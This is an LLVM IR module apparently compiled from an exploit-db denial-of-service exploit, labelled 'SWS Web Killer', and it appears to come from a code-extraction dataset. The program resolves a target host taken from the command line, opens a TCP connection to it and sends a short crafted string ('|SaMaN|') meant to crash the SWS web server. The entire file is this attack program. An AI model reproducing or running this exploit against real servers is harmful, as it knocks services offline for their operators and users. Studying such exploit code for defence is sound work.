; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_21775.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_21775.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.buf = private unnamed_addr constant [8 x i8] c"|SaMaN|\00", align 1
@.str = private unnamed_addr constant [37 x i8] c"%s=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\0A\00", align 1
@K = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [37 x i8] c"%sSWS Web Killer (saman@hush.com)  \0A\00", align 1
@SA = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [37 x i8] c"%sUsage: ./sws_web_killer %s<IP>   \0A\00", align 1
@Y = common dso_local global i8* null, align 8
@M = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"send\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca [8 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = bitcast [8 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([8 x i8], [8 x i8]* @__const.main.buf, i32 0, i32 0), i64 8, i1 false)
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 2
  br i1 %13, label %14, label %24

14:                                               ; preds = %2
  %15 = load i8*, i8** @K, align 8
  %16 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i8* %15)
  %17 = load i8*, i8** @SA, align 8
  %18 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = load i8*, i8** @K, align 8
  %20 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = load i8*, i8** @Y, align 8
  %22 = load i8*, i8** @M, align 8
  %23 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i8* %21, i8* %22)
  store i32 0, i32* %3, align 4
  br label %76

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %8, align 8
  %29 = icmp eq %struct.hostent* %28, null
  br i1 %29, label %30, label %33

30:                                               ; preds = %24
  %31 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @exit(i32 1) #4
  unreachable

33:                                               ; preds = %24
  %34 = load i32, i32* @AF_INET, align 4
  %35 = load i32, i32* @SOCK_STREAM, align 4
  %36 = call i32 @socket(i32 %34, i32 %35, i32 0)
  store i32 %36, i32* %6, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %41

38:                                               ; preds = %33
  %39 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %40 = call i32 @exit(i32 1) #4
  unreachable

41:                                               ; preds = %33
  %42 = load i32, i32* @AF_INET, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  store i32 %42, i32* %43, align 4
  %44 = load i32, i32* @PORT, align 4
  %45 = call i32 @htons(i32 %44)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %48 = load %struct.hostent*, %struct.hostent** %8, align 8
  %49 = getelementptr inbounds %struct.hostent, %struct.hostent* %48, i32 0, i32 0
  %50 = load i64, i64* %49, align 8
  %51 = inttoptr i64 %50 to %struct.in_addr*
  %52 = bitcast %struct.in_addr* %47 to i8*
  %53 = bitcast %struct.in_addr* %51 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %52, i8* align 4 %53, i64 4, i1 false)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %55 = call i32 @memset(i32* %54, i8 signext 0, i32 8)
  %56 = load i32, i32* %6, align 4
  %57 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 4)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %63

60:                                               ; preds = %41
  %61 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %62 = call i32 @exit(i32 1) #4
  unreachable

63:                                               ; preds = %41
  %64 = load i32, i32* %6, align 4
  %65 = getelementptr inbounds [8 x i8], [8 x i8]* %10, i64 0, i64 0
  %66 = getelementptr inbounds [8 x i8], [8 x i8]* %10, i64 0, i64 0
  %67 = call i32 @strlen(i8* %66)
  %68 = call i32 @send(i32 %64, i8* %65, i32 %67, i32 0)
  store i32 %68, i32* %7, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %73

70:                                               ; preds = %63
  %71 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %72 = call i32 @exit(i32 1) #4
  unreachable

73:                                               ; preds = %63
  %74 = load i32, i32* %6, align 4
  %75 = call i32 @close(i32 %74)
  store i32 0, i32* %3, align 4
  br label %76

76:                                               ; preds = %73, %14
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, i8*, ...) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memset(i32*, i8 signext, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
